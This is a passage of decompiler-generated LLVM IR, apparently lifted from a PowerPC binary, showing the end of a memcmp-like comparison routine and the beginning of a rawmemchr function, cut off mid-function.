  br i1 %v4_10026e28, label %dec_label_pc_10026e40, label %dec_label_pc_10026e38

dec_label_pc_10026e38:                            ; preds = %dec_label_pc_10026e28
  %v3_10026e38 = icmp ugt i32 %v0_10026e38, %v1_10026e38
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10026e38, label %dec_label_pc_10026e98, label %dec_label_pc_10026e90

dec_label_pc_10026e40:                            ; preds = %dec_label_pc_10026e28, %dec_label_pc_10026de4
  %v0_10026e6858 = phi i32 [ %v0_10026e6859, %dec_label_pc_10026e28 ], [ %v1_10026df0, %dec_label_pc_10026de4 ]
  %v0_10026e48 = phi i32 [ %v0_10026e30, %dec_label_pc_10026e28 ], [ %v1_10026dec, %dec_label_pc_10026de4 ]
  %v0_10026e44 = phi i32 [ %v0_10026e2c, %dec_label_pc_10026e28 ], [ %v1_10026de8, %dec_label_pc_10026de4 ]
  %v1_10026e40 = phi i32 [ %v3_10026e30, %dec_label_pc_10026e28 ], [ %v2_10026dc0, %dec_label_pc_10026de4 ]
  %v0_10026e40 = phi i32 [ %v3_10026e2c, %dec_label_pc_10026e28 ], [ %v2_10026dc4, %dec_label_pc_10026de4 ]
  %v4_10026e40 = icmp eq i32 %v0_10026e40, %v1_10026e40
  store i1 %v4_10026e40, i1* %cr7_eq.global-to-local, align 1
  %v1_10026e44 = add i32 %v0_10026e44, 8
  %v2_10026e44 = inttoptr i32 %v1_10026e44 to i32*
  %v3_10026e44 = load i32, i32* %v2_10026e44, align 4
  %v1_10026e48 = add i32 %v0_10026e48, 8
  %v2_10026e48 = inttoptr i32 %v1_10026e48 to i32*
  %v3_10026e48 = load i32, i32* %v2_10026e48, align 4
  store i32 %v3_10026e48, i32* %r0.global-to-local, align 4
  br i1 %v4_10026e40, label %dec_label_pc_10026e50, label %dec_label_pc_10026e8c

dec_label_pc_10026e50:                            ; preds = %dec_label_pc_10026e40, %dec_label_pc_10026dcc
  %v0_10026e68 = phi i32 [ %v0_10026e6858, %dec_label_pc_10026e40 ], [ %v1_10026ddc, %dec_label_pc_10026dcc ]
  %v0_10026e74 = phi i32 [ %v0_10026e48, %dec_label_pc_10026e40 ], [ %v1_10026dd8, %dec_label_pc_10026dcc ]
  %v0_10026e70 = phi i32 [ %v0_10026e44, %dec_label_pc_10026e40 ], [ %v1_10026dd0, %dec_label_pc_10026dcc ]
  %v1_10026e60 = phi i32 [ %v3_10026e48, %dec_label_pc_10026e40 ], [ %v2_10026dc0, %dec_label_pc_10026dcc ]
  %v0_10026e60 = phi i32 [ %v3_10026e44, %dec_label_pc_10026e40 ], [ %v2_10026dc4, %dec_label_pc_10026dcc ]
  %v4_10026e50 = icmp eq i32 %v0_10026e60, %v1_10026e60
  store i1 %v4_10026e50, i1* %cr7_eq.global-to-local, align 1
  %v1_10026e54 = add i32 %v0_10026e70, 12
  %v2_10026e54 = inttoptr i32 %v1_10026e54 to i32*
  %v3_10026e54 = load i32, i32* %v2_10026e54, align 4
  %v1_10026e58 = add i32 %v0_10026e74, 12
  %v2_10026e58 = inttoptr i32 %v1_10026e58 to i32*
  %v3_10026e58 = load i32, i32* %v2_10026e58, align 4
  br i1 %v4_10026e50, label %dec_label_pc_10026e68, label %dec_label_pc_10026e60

dec_label_pc_10026e60:                            ; preds = %dec_label_pc_10026e50
  %v3_10026e60 = icmp ugt i32 %v0_10026e60, %v1_10026e60
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10026e60, label %dec_label_pc_10026e98, label %dec_label_pc_10026e90

dec_label_pc_10026e68:                            ; preds = %dec_label_pc_10026e50
  %v1_10026e68 = add i32 %v0_10026e68, -4
  %v4_10026e68 = icmp eq i32 %v1_10026e68, 0
  br i1 %v4_10026e68, label %dec_label_pc_10026e7c, label %dec_label_pc_10026e70

dec_label_pc_10026e70:                            ; preds = %dec_label_pc_10026e68
  %v1_10026e70 = add i32 %v0_10026e70, 16
  %v1_10026e74 = add i32 %v0_10026e74, 16
  br label %dec_label_pc_10026e18

dec_label_pc_10026e7c:                            ; preds = %dec_label_pc_10026e68
  %v4_10026e7c = icmp eq i32 %v3_10026e54, %v3_10026e58
  store i1 %v4_10026e7c, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v4_10026e7c, label %dec_label_pc_10026ff0, label %dec_label_pc_10026e8c

dec_label_pc_10026e8c:                            ; preds = %dec_label_pc_10026e7c, %dec_label_pc_10026e18, %dec_label_pc_10026e40
  %v1_10026e88 = phi i32 [ %v3_10026e58, %dec_label_pc_10026e7c ], [ %v1_10026e18, %dec_label_pc_10026e18 ], [ %v1_10026e40, %dec_label_pc_10026e40 ]
  %v0_10026e88 = phi i32 [ %v3_10026e54, %dec_label_pc_10026e7c ], [ %v0_10026e18, %dec_label_pc_10026e18 ], [ %v0_10026e40, %dec_label_pc_10026e40 ]
  %v3_10026e88 = icmp ugt i32 %v0_10026e88, %v1_10026e88
  %v4_10026e88 = icmp eq i32 %v0_10026e88, %v1_10026e88
  store i1 %v4_10026e88, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10026e88, label %dec_label_pc_10026e98, label %dec_label_pc_10026e90

dec_label_pc_10026e90:                            ; preds = %dec_label_pc_10026e38, %dec_label_pc_10026e60, %dec_label_pc_10026e8c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10026ff0

dec_label_pc_10026e98:                            ; preds = %dec_label_pc_10026e38, %dec_label_pc_10026e60, %dec_label_pc_10026e8c
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10026ff0

dec_label_pc_10026ea4:                            ; preds = %dec_label_pc_10026d94
  %v1_10026ea8 = mul nuw nsw i32 %v1_10026d94, 8
  %v3_10026eac = icmp eq i32 %v1_10026da4, 1
  store i1 %v3_10026eac, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10026d9c, i32* %r6.global-to-local, align 4
  %v1_10026eb4 = call i32 @__asm_rlwinm(i32 %v0_10026e10, i32 0, i32 0, i32 29)
  %v1_10026eb8 = sub nsw i32 32, %v1_10026ea8
  %v0_10026ebc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10026ebc, label %dec_label_pc_10026f1c, label %dec_label_pc_10026ec0

dec_label_pc_10026ec0:                            ; preds = %dec_label_pc_10026ea4
  %v0_10026ec0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10026ec0 = icmp eq i32 %v0_10026ec0, 0
  %v3_10026ec0 = icmp eq i32 %v0_10026ec0, 1
  store i1 %v3_10026ec0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10026ec0, label %dec_label_pc_10026f0c, label %dec_label_pc_10026ec8

dec_label_pc_10026ec8:                            ; preds = %dec_label_pc_10026ec0
  %v3_10026ec8 = icmp eq i32 %v0_10026ec0, 3
  store i1 %v3_10026ec8, i1* %cr7_eq.global-to-local, align 1
  %v0_10026ecc = load i32, i32* @r4, align 4
  %v1_10026ecc = inttoptr i32 %v0_10026ecc to i32*
  %v2_10026ecc = load i32, i32* %v1_10026ecc, align 4
  %v1_10026ed0 = inttoptr i32 %v1_10026eb4 to i32*
  %v2_10026ed0 = load i32, i32* %v1_10026ed0, align 4
  store i32 %v2_10026ed0, i32* %r0.global-to-local, align 4
  %v1_10026ed4 = add i32 %v1_10026eb4, 4
  %v2_10026ed4 = inttoptr i32 %v1_10026ed4 to i32*
  %v3_10026ed4 = load i32, i32* %v2_10026ed4, align 4
  store i32 %v3_10026ed4, i32* %r9.global-to-local, align 4
  br i1 %v3_10026ec8, label %dec_label_pc_10026ef4, label %dec_label_pc_10026edc

dec_label_pc_10026edc:                            ; preds = %dec_label_pc_10026ec8
  %v1_10026ee4 = add i32 %v1_10026eb4, -4
  %v1_10026ee8 = add i32 %v0_10026ecc, -8
  %v0_10026eec = load i32, i32* %r6.global-to-local, align 4
  %v1_10026eec = add i32 %v0_10026eec, 2
  store i32 %v1_10026eec, i32* %r6.global-to-local, align 4
  %.pre79 = urem i32 %v1_10026ea8, 64
  %.pre80 = urem i32 %v1_10026eb8, 64
  br label %dec_label_pc_10026f88

dec_label_pc_10026ef4:                            ; preds = %dec_label_pc_10026ec8
  %v1_10026f00 = add i32 %v0_10026ecc, -4
  %v0_10026f04 = load i32, i32* %r6.global-to-local, align 4
  %v1_10026f04 = add i32 %v0_10026f04, 1
  store i32 %v1_10026f04, i32* %r6.global-to-local, align 4
  %.pre77 = urem i32 %v1_10026ea8, 64
  %.pre78 = urem i32 %v1_10026eb8, 64
  br label %dec_label_pc_10026f6c

dec_label_pc_10026f0c:                            ; preds = %dec_label_pc_10026ec0
  %v1_10026f0c = inttoptr i32 %v1_10026eb4 to i32*
  %v2_10026f0c = load i32, i32* %v1_10026f0c, align 4
  %v0_10026f10 = load i32, i32* @r4, align 4
  %v1_10026f14 = add i32 %v1_10026eb4, 4
  %v2_10026f14 = inttoptr i32 %v1_10026f14 to i32*
  %v3_10026f14 = load i32, i32* %v2_10026f14, align 4
  %.pre75 = urem i32 %v1_10026ea8, 64
  %.pre76 = urem i32 %v1_10026eb8, 64
  br label %dec_label_pc_10026f50

dec_label_pc_10026f1c:                            ; preds = %dec_label_pc_10026ea4
  %v1_10026f1c = inttoptr i32 %v1_10026eb4 to i32*
  %v2_10026f1c = load i32, i32* %v1_10026f1c, align 4
  %v0_10026f20 = load i32, i32* %r9.global-to-local, align 4
  %v1_10026f20 = add i32 %v0_10026f20, -1
  store i32 %v1_10026f20, i32* %r6.global-to-local, align 4
  %v1_10026f24 = add i32 %v1_10026eb4, 4
  %v2_10026f24 = inttoptr i32 %v1_10026f24 to i32*
  %v3_10026f24 = load i32, i32* %v2_10026f24, align 4
  %v1_10026f28 = add i32 %v1_10026eb4, 8
  %v0_10026f2c = load i32, i32* @r4, align 4
  %v1_10026f2c = inttoptr i32 %v0_10026f2c to i32*
  %v2_10026f2c = load i32, i32* %v1_10026f2c, align 4
  %v1_10026f30 = add i32 %v0_10026f2c, 4
  %.pre = urem i32 %v1_10026ea8, 64
  %.pre74 = urem i32 %v1_10026eb8, 64
  br label %dec_label_pc_10026f34

dec_label_pc_10026f34:                            ; preds = %dec_label_pc_10026fb4, %dec_label_pc_10026f1c
  %v2_10026f38.pre-phi = phi i32 [ %v2_10026f8c.pre-phi, %dec_label_pc_10026fb4 ], [ %.pre74, %dec_label_pc_10026f1c ]
  %v2_10026f34.pre-phi = phi i32 [ %v2_10026f88.pre-phi, %dec_label_pc_10026fb4 ], [ %.pre, %dec_label_pc_10026f1c ]
  %v1_10026f44 = phi i32 [ %v3_10026f9c, %dec_label_pc_10026fb4 ], [ %v2_10026f2c, %dec_label_pc_10026f1c ]
  %v0_10026f40 = phi i32 [ %v1_10026fb4, %dec_label_pc_10026fb4 ], [ %v1_10026f28, %dec_label_pc_10026f1c ]
  %v0_10026f38 = phi i32 [ %v3_10026f94, %dec_label_pc_10026fb4 ], [ %v3_10026f24, %dec_label_pc_10026f1c ]
  %v0_10026f34 = phi i32 [ %v0_10026fc0, %dec_label_pc_10026fb4 ], [ %v2_10026f1c, %dec_label_pc_10026f1c ]
  %storemerge2 = phi i32 [ %v1_10026fb8, %dec_label_pc_10026fb4 ], [ %v1_10026f30, %dec_label_pc_10026f1c ]
  %v3_10026f34 = shl i32 %v0_10026f34, %v2_10026f34.pre-phi
  %v3_10026f38 = lshr i32 %v0_10026f38, %v2_10026f38.pre-phi
  store i32 %v3_10026f38, i32* %r9.global-to-local, align 4
  %v2_10026f3c = or i32 %v3_10026f34, %v3_10026f38
  store i32 %v2_10026f3c, i32* %r0.global-to-local, align 4
  %v1_10026f40 = inttoptr i32 %v0_10026f40 to i32*
  %v2_10026f40 = load i32, i32* %v1_10026f40, align 4
  %v4_10026f44 = icmp eq i32 %v2_10026f3c, %v1_10026f44
  store i1 %v4_10026f44, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10026f44, label %dec_label_pc_10026f50, label %dec_label_pc_10026fd8

dec_label_pc_10026f50:                            ; preds = %dec_label_pc_10026f34, %dec_label_pc_10026f0c
  %v2_10026f54.pre-phi = phi i32 [ %v2_10026f38.pre-phi, %dec_label_pc_10026f34 ], [ %.pre76, %dec_label_pc_10026f0c ]
  %v2_10026f50.pre-phi = phi i32 [ %v2_10026f34.pre-phi, %dec_label_pc_10026f34 ], [ %.pre75, %dec_label_pc_10026f0c ]
  %v0_10026f64 = phi i32 [ %storemerge2, %dec_label_pc_10026f34 ], [ %v0_10026f10, %dec_label_pc_10026f0c ]
  %v1_10026f60.in.in = phi i32 [ %storemerge2, %dec_label_pc_10026f34 ], [ %v0_10026f10, %dec_label_pc_10026f0c ]
  %v0_10026f5c = phi i32 [ %v0_10026f40, %dec_label_pc_10026f34 ], [ %v1_10026f14, %dec_label_pc_10026f0c ]
  %v0_10026f54 = phi i32 [ %v2_10026f40, %dec_label_pc_10026f34 ], [ %v3_10026f14, %dec_label_pc_10026f0c ]
  %v0_10026f50 = phi i32 [ %v0_10026f38, %dec_label_pc_10026f34 ], [ %v2_10026f0c, %dec_label_pc_10026f0c ]
  %v1_10026f60.in = inttoptr i32 %v1_10026f60.in.in to i32*
  %v1_10026f60 = load i32, i32* %v1_10026f60.in, align 4
  %v3_10026f50 = shl i32 %v0_10026f50, %v2_10026f50.pre-phi
  %v3_10026f54 = lshr i32 %v0_10026f54, %v2_10026f54.pre-phi
  store i32 %v3_10026f54, i32* %r9.global-to-local, align 4
  %v2_10026f58 = or i32 %v3_10026f50, %v3_10026f54
  store i32 %v2_10026f58, i32* %r0.global-to-local, align 4
  %v1_10026f5c = add i32 %v0_10026f5c, 4
  %v2_10026f5c = inttoptr i32 %v1_10026f5c to i32*
  %v3_10026f5c = load i32, i32* %v2_10026f5c, align 4
  %v4_10026f60 = icmp eq i32 %v2_10026f58, %v1_10026f60
  store i1 %v4_10026f60, i1* %cr7_eq.global-to-local, align 1
  %v1_10026f64 = add i32 %v0_10026f64, 4
  %v2_10026f64 = inttoptr i32 %v1_10026f64 to i32*
  %v3_10026f64 = load i32, i32* %v2_10026f64, align 4
  br i1 %v4_10026f60, label %dec_label_pc_10026f6c, label %dec_label_pc_10026fdc

dec_label_pc_10026f6c:                            ; preds = %dec_label_pc_10026f50, %dec_label_pc_10026ef4
  %v2_10026f70.pre-phi = phi i32 [ %v2_10026f54.pre-phi, %dec_label_pc_10026f50 ], [ %.pre78, %dec_label_pc_10026ef4 ]
  %v2_10026f6c.pre-phi = phi i32 [ %v2_10026f50.pre-phi, %dec_label_pc_10026f50 ], [ %.pre77, %dec_label_pc_10026ef4 ]
  %v0_10026f80 = phi i32 [ %v0_10026f64, %dec_label_pc_10026f50 ], [ %v1_10026f00, %dec_label_pc_10026ef4 ]
  %v1_10026f7c = phi i32 [ %v3_10026f64, %dec_label_pc_10026f50 ], [ %v2_10026ecc, %dec_label_pc_10026ef4 ]
  %v0_10026f78 = phi i32 [ %v0_10026f5c, %dec_label_pc_10026f50 ], [ %v1_10026eb4, %dec_label_pc_10026ef4 ]
  %v0_10026f70 = phi i32 [ %v3_10026f5c, %dec_label_pc_10026f50 ], [ %v3_10026ed4, %dec_label_pc_10026ef4 ]
  %v0_10026f6c = phi i32 [ %v0_10026f54, %dec_label_pc_10026f50 ], [ %v2_10026ed0, %dec_label_pc_10026ef4 ]
  %v3_10026f6c = shl i32 %v0_10026f6c, %v2_10026f6c.pre-phi
  %v3_10026f70 = lshr i32 %v0_10026f70, %v2_10026f70.pre-phi
  store i32 %v3_10026f70, i32* %r9.global-to-local, align 4
  %v2_10026f74 = or i32 %v3_10026f6c, %v3_10026f70
  store i32 %v2_10026f74, i32* %r0.global-to-local, align 4
  %v1_10026f78 = add i32 %v0_10026f78, 8
  %v2_10026f78 = inttoptr i32 %v1_10026f78 to i32*
  %v3_10026f78 = load i32, i32* %v2_10026f78, align 4
  %v4_10026f7c = icmp eq i32 %v2_10026f74, %v1_10026f7c
  store i1 %v4_10026f7c, i1* %cr7_eq.global-to-local, align 1
  %v1_10026f80 = add i32 %v0_10026f80, 8
  %v2_10026f80 = inttoptr i32 %v1_10026f80 to i32*
  %v3_10026f80 = load i32, i32* %v2_10026f80, align 4
  br i1 %v4_10026f7c, label %dec_label_pc_10026f88, label %dec_label_pc_10026fd8

dec_label_pc_10026f88:                            ; preds = %dec_label_pc_10026f6c, %dec_label_pc_10026edc
  %v2_10026f8c.pre-phi = phi i32 [ %v2_10026f70.pre-phi, %dec_label_pc_10026f6c ], [ %.pre80, %dec_label_pc_10026edc ]
  %v2_10026f88.pre-phi = phi i32 [ %v2_10026f6c.pre-phi, %dec_label_pc_10026f6c ], [ %.pre79, %dec_label_pc_10026edc ]
  %v0_10026fb8 = phi i32 [ %v0_10026f80, %dec_label_pc_10026f6c ], [ %v1_10026ee8, %dec_label_pc_10026edc ]
  %v1_10026f98 = phi i32 [ %v3_10026f80, %dec_label_pc_10026f6c ], [ %v2_10026ecc, %dec_label_pc_10026edc ]
  %v0_10026fb4 = phi i32 [ %v0_10026f78, %dec_label_pc_10026f6c ], [ %v1_10026ee4, %dec_label_pc_10026edc ]
  %v0_10026fc0 = phi i32 [ %v3_10026f78, %dec_label_pc_10026f6c ], [ %v3_10026ed4, %dec_label_pc_10026edc ]
  %v0_10026f88 = phi i32 [ %v0_10026f70, %dec_label_pc_10026f6c ], [ %v2_10026ed0, %dec_label_pc_10026edc ]
  %v3_10026f88 = shl i32 %v0_10026f88, %v2_10026f88.pre-phi
  %v3_10026f8c = lshr i32 %v0_10026fc0, %v2_10026f8c.pre-phi
  store i32 %v3_10026f8c, i32* %r9.global-to-local, align 4
  %v2_10026f90 = or i32 %v3_10026f88, %v3_10026f8c
  store i32 %v2_10026f90, i32* %r0.global-to-local, align 4
  %v1_10026f94 = add i32 %v0_10026fb4, 12
  %v2_10026f94 = inttoptr i32 %v1_10026f94 to i32*
  %v3_10026f94 = load i32, i32* %v2_10026f94, align 4
  %v4_10026f98 = icmp eq i32 %v2_10026f90, %v1_10026f98
  store i1 %v4_10026f98, i1* %cr7_eq.global-to-local, align 1
  %v1_10026f9c = add i32 %v0_10026fb8, 12
  %v2_10026f9c = inttoptr i32 %v1_10026f9c to i32*
  %v3_10026f9c = load i32, i32* %v2_10026f9c, align 4
  br i1 %v4_10026f98, label %dec_label_pc_10026fac, label %dec_label_pc_10026fdc

dec_label_pc_10026fac:                            ; preds = %dec_label_pc_10026f88
  %v0_10026fac = load i32, i32* %r6.global-to-local, align 4
  %v1_10026fac = add i32 %v0_10026fac, -4
  store i32 %v1_10026fac, i32* %r6.global-to-local, align 4
  %v4_10026fac = icmp eq i32 %v1_10026fac, 0
  br i1 %v4_10026fac, label %dec_label_pc_10026fc0, label %dec_label_pc_10026fb4

dec_label_pc_10026fb4:                            ; preds = %dec_label_pc_10026fac
  %v1_10026fb4 = add i32 %v0_10026fb4, 16
  %v1_10026fb8 = add i32 %v0_10026fb8, 16
  br label %dec_label_pc_10026f34

dec_label_pc_10026fc0:                            ; preds = %dec_label_pc_10026fac
  %v3_10026fc0 = shl i32 %v0_10026fc0, %v2_10026f88.pre-phi
  %v3_10026fc4 = lshr i32 %v3_10026f94, %v2_10026f8c.pre-phi
  store i32 %v3_10026fc4, i32* %r9.global-to-local, align 4
  %v2_10026fc8 = or i32 %v3_10026fc4, %v3_10026fc0
  store i32 %v2_10026fc8, i32* %r0.global-to-local, align 4
  %v4_10026fd0 = icmp eq i32 %v2_10026fc8, %v3_10026f9c
  store i1 %v4_10026fd0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10026fd0, label %dec_label_pc_10026ff0, label %dec_label_pc_10026fd8

dec_label_pc_10026fd8:                            ; preds = %dec_label_pc_10026f6c, %dec_label_pc_10026f34, %dec_label_pc_10026fc0
  %v1_10026fd8 = phi i32 [ %v1_10026f7c, %dec_label_pc_10026f6c ], [ %v1_10026f44, %dec_label_pc_10026f34 ], [ %v3_10026f9c, %dec_label_pc_10026fc0 ]
  %v0_10026fd8 = phi i32 [ %v2_10026f74, %dec_label_pc_10026f6c ], [ %v2_10026f3c, %dec_label_pc_10026f34 ], [ %v2_10026fc8, %dec_label_pc_10026fc0 ]
  %v3_10026fd8 = icmp ugt i32 %v0_10026fd8, %v1_10026fd8
  %v4_10026fd8 = icmp eq i32 %v0_10026fd8, %v1_10026fd8
  store i1 %v4_10026fd8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10026fd8, label %dec_label_pc_10026fe8, label %dec_label_pc_10026fe0

dec_label_pc_10026fdc:                            ; preds = %dec_label_pc_10026f88, %dec_label_pc_10026f50
  %v1_10026fa4 = phi i32 [ %v1_10026f98, %dec_label_pc_10026f88 ], [ %v1_10026f60, %dec_label_pc_10026f50 ]
  %v0_10026fa4 = phi i32 [ %v2_10026f90, %dec_label_pc_10026f88 ], [ %v2_10026f58, %dec_label_pc_10026f50 ]
  %v3_10026fa4 = icmp ugt i32 %v0_10026fa4, %v1_10026fa4
  %v4_10026fa4 = icmp eq i32 %v0_10026fa4, %v1_10026fa4
  store i1 %v4_10026fa4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10026fa4, label %dec_label_pc_10026fe8, label %dec_label_pc_10026fe0

dec_label_pc_10026fe0:                            ; preds = %dec_label_pc_10026fd8, %dec_label_pc_10026fdc
  br label %dec_label_pc_10026ff0

dec_label_pc_10026fe8:                            ; preds = %dec_label_pc_10026fd8, %dec_label_pc_10026fdc
  br label %dec_label_pc_10026ff0

dec_label_pc_10026ff0:                            ; preds = %dec_label_pc_10026fe8, %dec_label_pc_10026fe0, %dec_label_pc_10026fc0, %dec_label_pc_10026e98, %dec_label_pc_10026e90, %dec_label_pc_10026e7c
  %storemerge = phi i32 [ 0, %dec_label_pc_10026e7c ], [ -1, %dec_label_pc_10026e90 ], [ 1, %dec_label_pc_10026e98 ], [ 0, %dec_label_pc_10026fc0 ], [ -1, %dec_label_pc_10026fe0 ], [ 1, %dec_label_pc_10026fe8 ]
  %v3_10026ff0 = icmp eq i32 %storemerge, 0
  store i1 %v3_10026ff0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10026ff0, label %dec_label_pc_1002700c, label %dec_label_pc_1002704c

dec_label_pc_10026ffc:                            ; preds = %dec_label_pc_10026d6c
  br label %dec_label_pc_1002704c

dec_label_pc_10027004:                            ; preds = %dec_label_pc_10027020
  br label %dec_label_pc_1002704c

dec_label_pc_1002700c:                            ; preds = %dec_label_pc_10026ff0
  %v0_1002700c = load i32, i32* @r31, align 4
  %v1_1002700c = call i32 @__asm_rlwinm(i32 %v0_1002700c, i32 0, i32 0, i32 29)
  store i32 %v1_1002700c, i32* %r0.global-to-local, align 4
  %v0_10027010 = load i32, i32* @r31, align 4
  %v1_10027010 = urem i32 %v0_10027010, 4
  %v0_10027014 = load i32, i32* %r29.global-to-local, align 4
  %v2_10027014 = add i32 %v0_10027014, %v1_1002700c
  store i32 %v2_10027014, i32* @r4, align 4
  %v0_10027018 = load i32, i32* @r30, align 4
  %v2_10027018 = add i32 %v0_10027018, %v1_1002700c
  store i32 %v2_10027018, i32* @r3, align 4
  br label %dec_label_pc_1002703c

dec_label_pc_10027020:                            ; preds = %dec_label_pc_10027044
  %v0_10027020 = load i32, i32* @r3, align 4
  %v1_10027020 = inttoptr i32 %v0_10027020 to i8*
  %v2_10027020 = load i8, i8* %v1_10027020, align 1
  %v3_10027020 = zext i8 %v2_10027020 to i32
  store i32 %v3_10027020, i32* %r0.global-to-local, align 4
  %v1_10027024 = add i32 %v0_10027020, 1
  store i32 %v1_10027024, i32* @r3, align 4
  %v0_10027028 = load i32, i32* @r4, align 4
  %v1_10027028 = inttoptr i32 %v0_10027028 to i8*
  %v2_10027028 = load i8, i8* %v1_10027028, align 1
  %v3_10027028 = zext i8 %v2_10027028 to i32
  store i32 %v3_10027028, i32* %r9.global-to-local, align 4
  %v1_1002702c = add i32 %v0_10027028, 1
  store i32 %v1_1002702c, i32* @r4, align 4
  %v2_10027030 = sub nsw i32 %v3_10027020, %v3_10027028
  store i32 %v2_10027030, i32* %r0.global-to-local, align 4
  %v4_10027034 = icmp eq i8 %v2_10027020, %v2_10027028
  br i1 %v4_10027034, label %dec_label_pc_10027044, label %dec_label_pc_10027004

dec_label_pc_1002703c:                            ; preds = %entry, %dec_label_pc_1002700c
  %v0_1002703c = phi i32 [ %arg1, %entry ], [ %v1_10027010, %dec_label_pc_1002700c ]
  %v1_1002703c = add i32 %v0_1002703c, 1
  br label %dec_label_pc_10027044

dec_label_pc_10027044:                            ; preds = %dec_label_pc_10027020, %dec_label_pc_1002703c
  %v0_10027044 = phi i32 [ %v1_10027044, %dec_label_pc_10027020 ], [ %v1_1002703c, %dec_label_pc_1002703c ]
  %v1_10027044 = add i32 %v0_10027044, -1
  %v2_10027044 = icmp eq i32 %v1_10027044, 0
  br i1 %v2_10027044, label %dec_label_pc_10027048, label %dec_label_pc_10027020

dec_label_pc_10027048:                            ; preds = %dec_label_pc_10027044
  br label %dec_label_pc_1002704c

dec_label_pc_1002704c:                            ; preds = %dec_label_pc_10026ff0, %dec_label_pc_10027004, %dec_label_pc_10026ffc, %dec_label_pc_10027048
  %v0_10027054 = phi i32 [ %storemerge, %dec_label_pc_10026ff0 ], [ %v2_10027030, %dec_label_pc_10027004 ], [ %v2_10026d80, %dec_label_pc_10026ffc ], [ 0, %dec_label_pc_10027048 ]
  ret i32 %v0_10027054

; uselistorder directives
  uselistorder i32 %v1_10027044, { 1, 0 }
  uselistorder i32 %v0_10026fa4, { 1, 0 }
  uselistorder i32 %v1_10026fa4, { 1, 0 }
  uselistorder i32 %v0_10026fd8, { 1, 0 }
  uselistorder i32 %v1_10026fd8, { 1, 0 }
  uselistorder i32 %v2_10026f88.pre-phi, { 1, 0, 2 }
  uselistorder i32 %v2_10026f8c.pre-phi, { 1, 0, 2 }
  uselistorder i32 %v1_10026f60, { 1, 0 }
  uselistorder i32 %v0_10026ec0, { 0, 2, 1 }
  uselistorder i32 %v1_10026eb4, { 0, 2, 1, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %v1_10026ea8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10026e88, { 1, 0 }
  uselistorder i32 %v1_10026e88, { 1, 0 }
  uselistorder i32 %v1_10026e68, { 1, 0 }
  uselistorder i32 %v1_10026da4, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_10026d9c, { 1, 5, 4, 3, 2, 6, 0 }
  uselistorder i32 %v1_10026d88, { 1, 0 }
  uselistorder i32 %v0_10026e14, { 1, 2, 3, 4, 5, 6, 7, 10, 0, 9, 8 }
  uselistorder i32 %v0_10026e10, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 0, 11, 10 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11, 12 }
  uselistorder i32* %r6.global-to-local, { 0, 4, 1, 2, 5, 3, 6, 7 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 17, 9, 10, 11, 12, 13, 14, 15, 16, 18, 20, 19 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 2, 23, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 -8, { 4, 5, 6, 7, 9, 10, 3, 11, 2, 1, 8, 12, 13, 14, 0 }
  uselistorder i1 false, { 9, 10, 11, 5, 6, 12, 13, 18, 19, 22, 0, 21, 8, 1, 2, 25, 26, 27, 7, 20, 23, 24, 15, 14, 3, 16, 17, 4, 28 }
  uselistorder i32 15, { 5, 6, 1, 0, 10, 7, 21, 18, 16, 17, 20, 8, 19, 9, 2, 3, 11, 12, 13, 4, 14, 15 }
  uselistorder i32 %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_1002704c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10027044, { 1, 0 }
  uselistorder label %dec_label_pc_1002703c, { 1, 0 }
  uselistorder label %dec_label_pc_10026fe8, { 1, 0 }
  uselistorder label %dec_label_pc_10026fe0, { 1, 0 }
  uselistorder label %dec_label_pc_10026fd8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10026e98, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10026e90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10026e8c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10026d88, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_10027058 = urem i32 %arg1, 256
  store i32 %v1_10027058, i32* %r4.global-to-local, align 4
  %v0_100270701 = load i32, i32* @r3, align 4
  %v1_100270702 = urem i32 %v0_100270701, 4
  %v3_100270704 = icmp eq i32 %v1_100270702, 0
  br i1 %v3_100270704, label %dec_label_pc_10027078, label %dec_label_pc_10027060

dec_label_pc_10027060:                            ; preds = %entry, %dec_label_pc_10027060
  %v1_10027064 = phi i32 [ %v0_10027078.pre, %dec_label_pc_10027060 ], [ %v1_10027058, %entry ]
  %v0_10027060 = phi i32 [ %v1_1002706c, %dec_label_pc_10027060 ], [ %v0_100270701, %entry ]
  %v1_10027060 = inttoptr i32 %v0_10027060 to i8*
  %v2_10027060 = load i8, i8* %v1_10027060, align 1
  %v3_10027060 = zext i8 %v2_10027060 to i32
  %v4_10027064 = icmp eq i32 %v3_10027060, %v1_10027064
  %v0_10027068 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10027064, i32 %v0_10027068)
  %v0_1002706c = load i32, i32* @r3, align 4
